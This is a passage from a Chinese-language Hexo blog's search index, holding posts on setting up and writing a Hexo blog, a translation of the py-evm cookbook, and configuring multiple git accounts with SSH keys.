target="_blank" rel="noopener">了解采矿过程</a><ul><li><a href="https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html#mining" target="_blank" rel="noopener">矿业</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html#mining-an-empty-block" target="_blank" rel="noopener">挖空块</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html#retrieving-a-valid-nonce-and-mix-hash" target="_blank" rel="noopener">检索有效的nonce并混合哈希</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html#mining-a-block-with-transactions" target="_blank" rel="noopener">使用事务挖掘块</a></li></ul></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/creating_opcodes.html" target="_blank" rel="noopener">创建操作码</a><ul><li><a href="https://py-evm.readthedocs.io/en/latest/guides/creating_opcodes.html#the-as-opcode-helper" target="_blank" rel="noopener"><code>as_opcode()</code>助手</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/creating_opcodes.html#opcodes-as-classes" target="_blank" rel="noopener">操作码为类</a></li></ul></li></ul><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> py-evm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Hexo写博客</title>
      <link href="/2019/06/05/writeBlog/"/>
      <url>/2019/06/05/writeBlog/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>空有页面而无内容，有一点小尴尬呢~这里主要讲基础，有很多更方便更fashion的操作就先不说了，写文章要紧</p><a id="more"></a><h2 id="创建一篇文章"><a href="#创建一篇文章" class="headerlink" title="创建一篇文章"></a>创建一篇文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个页面</span></span><br><span class="line">$ hexo new page &lt;page&gt;</span><br><span class="line"><span class="comment"># 创建一篇博客</span></span><br><span class="line">$ hexo new post &lt;title&gt;</span><br><span class="line"><span class="comment"># 创建一篇草稿</span></span><br><span class="line">$ hexo new draft &lt;title&gt;</span><br></pre></td></tr></table></figure><p>默认会在source/_posts目录下创建一个xxxx.md</p><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>模板在<code>./scaffolds</code>下，有post/draft/page三种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new post <span class="string">"article_name"</span></span><br></pre></td></tr></table></figure><p>一个模板</p><figure class="highlight markdown"><figcaption><span>scaffolds/post.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">updated: </span><br><span class="line">toc: true</span><br><span class="line">tags:</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">简介</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--more--&gt;</span></span></span><br><span class="line"></span><br><span class="line">正文</span><br></pre></td></tr></table></figure><h2 id="填充内容"><a href="#填充内容" class="headerlink" title="填充内容"></a>填充内容</h2><h3 id="头部"><a href="#头部" class="headerlink" title="头部"></a>头部</h3><p>常用关键字</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">如何在hexo博客上创建文章</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="bullet">-06</span><span class="bullet">-05</span><span class="string">,</span> <span class="number">22</span><span class="string">:38:16</span></span><br><span class="line"><span class="attr">update:</span> <span class="number">2019</span><span class="bullet">-06</span><span class="bullet">-05</span><span class="string">,</span> <span class="number">22</span><span class="string">:38:16</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">基础环境配置</span></span><br><span class="line"><span class="attr">tags:</span> </span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">github</span> </span><br><span class="line"><span class="attr">comments:</span> <span class="literal">false</span> <span class="comment">#是否可评论</span></span><br><span class="line"><span class="attr">toc:</span> <span class="literal">true</span> <span class="comment">#是否显示文章目录</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">"空有页面而无内容"</span> <span class="comment">#这就是保证在文章罗列的时候只显示摘要而不是所有内容</span></span><br></pre></td></tr></table></figure><p>yelee主题的标签云就依赖categories和tags标签，当然后续如果想显示他们，需要在sources下创建tags和categories文件夹并编辑index.md，详见<a href="https://segmentfault.com/q/1010000002561642" target="_blank" rel="noopener">hexo分类与tags配置</a></p><p>当然后来食用的主题是paperbox，没有descrption选项；如果需显示摘要；加入<code>&lt;!--more--&gt;</code>那么这个标签前面的内容即为摘要</p><h3 id="中部"><a href="#中部" class="headerlink" title="中部"></a>中部</h3><p>这个你要会markdown就成，就正儿八经写blog</p><h2 id="其余命令"><a href="#其余命令" class="headerlink" title="其余命令"></a>其余命令</h2><h3 id="预览草稿"><a href="#预览草稿" class="headerlink" title="预览草稿"></a>预览草稿</h3><p>如果你希望强行预览草稿，更改配置文件：</p><figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">render_drafts:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>或者，如下方式启动server，本地查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo S --draft</span></span><br></pre></td></tr></table></figure><p>虽然 <code>hexo generate</code> 不会编译 <code>source/_drafts</code> 目录下的文章，但 Hexo 的 <code>Hexo server</code> 另外提供 <code>--draft</code> 参数，这让我们只要搭配 <code>hexo-browsersync</code> plugins，就可以达到一边编辑 <code>markdown</code> 文章，一边使用浏览器预览的目的。</p><h3 id="将草稿发布为正式文章"><a href="#将草稿发布为正式文章" class="headerlink" title="将草稿发布为正式文章"></a>将草稿发布为正式文章</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo P &lt;filename&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo publish [layout] &lt;filename&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>&lt;filename&gt;</code> 为不包含 <code>md</code> 后缀的文章名称。</p><h3 id="发布一条龙"><a href="#发布一条龙" class="headerlink" title="发布一条龙"></a>发布一条龙</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo clean</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo g/generate</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo d/deploy</span></span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 工具指导 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Hexo创建博客</title>
      <link href="/2019/06/05/createBlog/"/>
      <url>/2019/06/05/createBlog/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><h2 id="基础步骤"><a href="#基础步骤" class="headerlink" title="基础步骤"></a>基础步骤</h2><p>选择一个喜欢的主题，比如我曾经的选择<a href="http://moxfive.xyz/" target="_blank" rel="noopener">Yelee</a>，因为有自己喜欢的功能，而且很好看；后来觉得不适合我高冷的性格，换了paperbox</p><a id="more"></a><p>这里给个repo,大佬真牛逼，写得超详细：<a href="https://segmentfault.com/a/1190000017986794；不过它用的是next主题" target="_blank" rel="noopener">https://segmentfault.com/a/1190000017986794；不过它用的是next主题</a></p><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>先安装准备 node 和 git 环境，mac下面直接用<code>brew install xxx</code>就成了</p><p>如果以上环境准备好了就可以使用 npm 开始安装 Hexo 了，官网有说</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装 Hexo 完成后，再执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init myBlog</span><br><span class="line"><span class="built_in">cd</span> myBlog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>npm如果老提示permission deny的话，记得修改下权限</p><p>最后，运行 <code>hexo s</code> 命令，其中 s 是 server 的缩写，在浏览器中输入 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 回车就可以预览效果了</p><h3 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h3><p>网上找吧，太多了</p><h3 id="github开一个repo"><a href="#github开一个repo" class="headerlink" title="github开一个repo"></a>github开一个repo</h3><p>这个repo名字得是 your github name/github.io</p><p>然后打开项目根目录下的 _config.yml 配置文件配置参数。拉到文件末尾，填上配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">    repo:</span></span><br><span class="line"><span class="attr">        github:</span><span class="attr">https://github.com/your_name/your_name.github.io.git</span></span><br><span class="line"><span class="attr">    branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h3 id="安装一个插件"><a href="#安装一个插件" class="headerlink" title="安装一个插件"></a>安装一个插件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>最后，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo g //generate</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo d //deploy</span></span><br></pre></td></tr></table></figure><p>应该能在你的repo下看见更新的内容了</p><h2 id="hexo博客搭建优化"><a href="#hexo博客搭建优化" class="headerlink" title="hexo博客搭建优化"></a>hexo博客搭建优化</h2><h3 id="关于如何提速"><a href="#关于如何提速" class="headerlink" title="关于如何提速"></a>关于如何提速</h3><p>目前看到的是，压缩，图床，CDN</p><p>法一：买域名+coding同时部署+域名解析分流</p><p>法二：上图床，至少图片加载快一些</p><p>法三：压缩，至少加载内容少一些</p><p>我觉得法一最治本；但是目前来说我觉得比较经济简单的方法是</p><ol><li><p>压缩：装个插件，最近发现的好东西，<code>npm install hexo-neat --save</code>，然后配置到根目录的_config.yml下</p><figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##hexo-neat页面压缩</span></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span> </span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  exclude:</span> </span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  exclude:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">'*.min.css'</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  mangle:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  output:</span></span><br><span class="line"><span class="attr">  compress:</span></span><br><span class="line"><span class="attr">  exclude:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">'*.min.js'</span></span><br></pre></td></tr></table></figure><p>最后正常发布就行；</p><p>gulp我安装失败，很遗憾，参考在这里：<a href="https://www.karlzhou.com/articles/compress-minify-hexo/；有点年代了感觉" target="_blank" rel="noopener">https://www.karlzhou.com/articles/compress-minify-hexo/；有点年代了感觉</a></p></li><li><p>上图床：这个我觉得sm.ms比较好，但是图片上传之后要考虑以后图床关闭以及迁移，比如迁移到自己的服务器或者采用了法一，其实图床用处就不太大了，这里最好准备一下转换脚本</p></li></ol><p>这两个一上，我估计我的blog速度应该会快很多；当然其实还是推荐买个域名，毕竟，github域名真的不太友好，貌似屏蔽了baidu的spider；域名直接在source目录下搞个CNAME，然后就会自动解析，最好勾选enable https选项</p><h2 id="关于Yelee主题的一些问题"><a href="#关于Yelee主题的一些问题" class="headerlink" title="关于Yelee主题的一些问题"></a>关于Yelee主题的一些问题</h2><p><a href="https://blog.csdn.net/youshaoduo/article/details/78709160" target="_blank" rel="noopener">Hexo中的Yelee主题，首页不显示文章摘要</a></p><p>从这篇博客你就知道，这是一个笔误，是themes/yelee/layout/_partial/head.ejs中的这段代码的search: &lt;%= theme.search.on %&gt;定义有问题。</p><p>具体代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> yiliaConfig = &#123;</span><br><span class="line">        fancybox: <span class="xml"><span class="tag">&lt;<span class="name">%=theme.fancybox%</span>&gt;</span>,</span></span><br><span class="line"><span class="xml">        animate: <span class="tag">&lt;<span class="name">%=theme.animate%</span>&gt;</span>,</span></span><br><span class="line"><span class="xml">        isHome: <span class="tag">&lt;<span class="name">%=is_home()%</span>&gt;</span>,</span></span><br><span class="line"><span class="xml">        isPost: <span class="tag">&lt;<span class="name">%=is_post()%</span>&gt;</span>,</span></span><br><span class="line"><span class="xml">        isArchive: <span class="tag">&lt;<span class="name">%=is_archive()%</span>&gt;</span>,</span></span><br><span class="line"><span class="xml">        isTag: <span class="tag">&lt;<span class="name">%=is_tag()%</span>&gt;</span>,</span></span><br><span class="line"><span class="xml">        isCategory: <span class="tag">&lt;<span class="name">%=is_category()%</span>&gt;</span>,</span></span><br><span class="line"><span class="xml">        fancybox_js: "<span class="tag">&lt;<span class="name">%-</span> <span class="attr">theme.CDN.fancybox_js</span> %&gt;</span>",</span></span><br><span class="line"><span class="xml">        scrollreveal: "<span class="tag">&lt;<span class="name">%-</span> <span class="attr">theme.CDN.scrollreveal</span> %&gt;</span>",</span></span><br><span class="line"><span class="xml">        search: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.search.on</span> %&gt;</span></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>注意看这里最后一个search，里面用的是on，而在yelee主题的_config.xml里默认设置是search:onload:false，这里写的是onload而不是on，导致Uncaught ReferenceError: yiliaConfig is not defined。</p><p>解决方法是把两边的变量名改成一样就可以了，比如yelee主题的_config.xml里面的<code>search:onload:false</code>改成<code>search:on:false</code>，这样就正常运行了。</p><p>其余的问题Yelee官方里也说的很明白了，就不说了</p><h2 id="关于paperbox主题的一些问题"><a href="#关于paperbox主题的一些问题" class="headerlink" title="关于paperbox主题的一些问题"></a>关于paperbox主题的一些问题</h2><p>单独写在别的博客里面了，不再赘述</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 工具指导 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py-evm之cookbook翻译</title>
      <link href="/2019/06/05/py-evm-cookbook/"/>
      <url>/2019/06/05/py-evm-cookbook/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>py-evm系列译文，有不当之处请联系改正，原文如下：<a href="https://py-evm.readthedocs.io/en/latest/cookbook/index.html" target="_blank" rel="noopener">https://py-evm.readthedocs.io/en/latest/cookbook/index.html</a></p><p>py-evm系列译文之1-cookbook翻译</p><a id="more"></a><h1 id="食谱"><a href="#食谱" class="headerlink" title="食谱"></a>食谱</h1><p>Cookbook是一系列简单的食谱，展示了完成常见任务的良好实践。这些示例通常是简单的“我如何……”问题的简短答案，这些问题超出了简单的API描述，但也不需要完整的指南才能变得清晰。</p><h2 id="使用Chain对象"><a href="#使用Chain对象" class="headerlink" title="使用Chain对象"></a>使用Chain对象</h2><p>一个”单独”的区块链是由一系列不同的虚拟机组成的，它们用于不同的块跨度，例如，以太坊主网有一个虚拟机用于块0到1150000（称为Frontier），另一个VM用于块1150000到1920000（称为Homestead）。</p><p><code>Chain</code>在定义VM范围后，该对象将管理一系列fork规则。例如，要设置一个跟踪主网以太坊网络的链，直到块1920000，您可以创建此链类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth <span class="keyword">import</span> constants, Chain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.vm.forks.frontier <span class="keyword">import</span> FrontierVM</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.vm.forks.homestead <span class="keyword">import</span> HomesteadVM</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.chains.mainnet <span class="keyword">import</span> HOMESTEAD_MAINNET_BLOCK</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chain_class = Chain.configure(</span><br><span class="line"><span class="meta">... </span>    __name__=<span class="string">'Test Chain'</span>,</span><br><span class="line"><span class="meta">... </span>    vm_configuration=(</span><br><span class="line"><span class="meta">... </span>        (constants.GENESIS_BLOCK_NUMBER, FrontierVM),</span><br><span class="line"><span class="meta">... </span>        (HOMESTEAD_MAINNET_BLOCK, HomesteadVM),</span><br><span class="line"><span class="meta">... </span>    ),</span><br><span class="line"><span class="meta">... </span>)</span><br></pre></td></tr></table></figure><p>然后要初始化，您可以使用内存数据库启动它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.db.atomic <span class="keyword">import</span> AtomicDB</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.chains.mainnet <span class="keyword">import</span> MAINNET_GENESIS_HEADER</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 开始一个新的内存数据酷酷</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 初始化一个新链</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chain = chain_class.from_genesis_header(AtomicDB(), MAINNET_GENESIS_HEADER)</span><br></pre></td></tr></table></figure><h2 id="用自定义状态创建链"><a href="#用自定义状态创建链" class="headerlink" title="用自定义状态创建链"></a>用自定义状态创建链</h2><p>虽然前面的食谱演示了如何从现有的genesis头创建链，但我们也可以通过指定各种genesis参数以及可选的genesis状态来创建链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth_keys <span class="keyword">import</span> keys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth <span class="keyword">import</span> constants</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.chains.mainnet <span class="keyword">import</span> MainnetChain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.db.atomic <span class="keyword">import</span> AtomicDB</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth_utils <span class="keyword">import</span> to_wei, encode_hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 给some_address加点赞助(就是往里面打钱)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>SOME_ADDRESS = <span class="string">b'\x85\x82\xa2\x89V\xb9%\x93M\x03\xdd\xb4Xu\xe1\x8e\x85\x93\x12\xc1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GENESIS_STATE = &#123;</span><br><span class="line"><span class="meta">... </span>    SOME_ADDRESS: &#123;</span><br><span class="line"><span class="meta">... </span>        <span class="string">"balance"</span>: to_wei(<span class="number">10000</span>, <span class="string">'ether'</span>),</span><br><span class="line"><span class="meta">... </span>        <span class="string">"nonce"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="meta">... </span>        <span class="string">"code"</span>: <span class="string">b''</span>,</span><br><span class="line"><span class="meta">... </span>        <span class="string">"storage"</span>: &#123;&#125;</span><br><span class="line"><span class="meta">... </span>    &#125;</span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GENESIS_PARAMS = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'parent_hash'</span>: constants.GENESIS_PARENT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'uncles_hash'</span>: constants.EMPTY_UNCLE_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'coinbase'</span>: constants.ZERO_ADDRESS,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'transaction_root'</span>: constants.BLANK_ROOT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'receipt_root'</span>: constants.BLANK_ROOT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'difficulty'</span>: constants.GENESIS_DIFFICULTY,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'block_number'</span>: constants.GENESIS_BLOCK_NUMBER,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'gas_limit'</span>: constants.GENESIS_GAS_LIMIT,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'extra_data'</span>: constants.GENESIS_EXTRA_DATA,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'nonce'</span>: constants.GENESIS_NONCE</span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chain = MainnetChain.from_genesis(AtomicDB(), GENESIS_PARAMS, GENESIS_STATE)</span><br></pre></td></tr></table></figure><h2 id="从帐户中获取余额"><a href="#从帐户中获取余额" class="headerlink" title="从帐户中获取余额"></a>从帐户中获取余额</h2><p>考虑到我们之前的例子，我们可以获得预付资金账户的余额如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>current_vm = chain.get_vm()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = current_vm.state</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.get_balance(SOME_ADDRESS)</span><br><span class="line"><span class="number">10000000000000000000000</span></span><br></pre></td></tr></table></figure><h2 id="递增构建块"><a href="#递增构建块" class="headerlink" title="递增构建块"></a>递增构建块</h2><p>默认链是无状态的,因此不能保持一个提示块开放,使我们逐步构建块。然而我们可以导入 允许我们构建块的<code>MiningChain</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.chains.base <span class="keyword">import</span> MiningChain</span><br></pre></td></tr></table></figure><p>请查看“ <a href="https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html" target="_blank" rel="noopener">了解挖掘过程指南</a> ”以获取演示如何使用<code>MiningChain</code>。的完整示例</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> py-evm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git多账号配置</title>
      <link href="/2018/07/19/git-configuration/"/>
      <url>/2018/07/19/git-configuration/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>原博客迁移，用于配置多环境的git账号；其实用一个ssh也没有太大问题吧。。</p><a id="more"></a><p>windows下和Linux下差不多，windows的话，用git bash比较好啦，一般来说，windows下的ssh存在 <code>c:\users\你用户名\.ssh\</code>下面，Linux应该是<code>~/.ssh</code>。<br>比如我现在要配置GitHub和工作环境下的GitLab，</p><h1 id="生成ssh"><a href="#生成ssh" class="headerlink" title="生成ssh"></a>生成ssh</h1><p><code>ssh-keygen -t rsa -C email.addr</code></p><p><img src="https://i.loli.net/2019/10/10/muqt4P9szMJVr8y.jpg" alt="例子"></p><p>默认的存储位置可以改，但是不建议，然后就是名字的话，得自己改改，你看我这里写的是id_rsa_Git，然后要求输入密码，我是默认没有了，你也可以输入<br>根据不同的email和账号，生成不同的ssh key，下面就是我生成的两对：</p><p><img src="https://i.loli.net/2019/10/10/2vdztxfJyBD4unN.jpg" alt="两对公私钥"></p><p>然后将两对ssh key分别加入到GitHub和gitlab上：</p><p><img src="https://i.loli.net/2019/10/10/2kY8F1IugdV49oL.jpg" alt="title自取"></p><p>#配置config<br>最重要的一步吧，同目录下，新建<code>config</code></p><p><img src="https://i.loli.net/2019/10/10/BmrPRCsgn98EqUo.jpg" alt="config"></p><ul><li>Host 最好不要乱改，它影响我们到时候的ssh地址的，比如我们<code>git@github.com:accountName/programName.git</code>，你要是把Host改成“gitgit”，那这个命令就成了<code>git@gitgit:accountName/programName.git</code></li><li>HostName 这就是真实域名地址，比如我的gitlab没有配置域名，就直接用的ip</li><li>IdentityFile 这就是id_rsa地址</li><li>PreferredAuthentications 配置登录的权限，这个有好多选项，比如 publickey, password publickey, keyboard-interactive啥啥啥的</li><li>User 应该是你提交代码的时候的，提交人的姓名</li></ul><p>#验证配置</p><p><img src="https://i.loli.net/2019/10/10/IqdfsZROlMexpc4.jpg" alt="验证"></p><p>红色涂掉的那个是我配置的User和ip，就不显示了，可能一开始使用 <code>ssh -T git@github.com</code>这种会显示”The authenticity of host ‘github.com’ can’t be established … Are you sure you want to continue connecting(yes/no)?”这里<strong>一定要</strong>填写“<strong>yes</strong>”，我直接敲空行默认就会”host authentication failed…”。<br>配置完了就成啦！然后后面就可以直接用ssh的方法连接啦~</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 工具指导 </category>
          
      </categories>
      
      
        <tags>
            
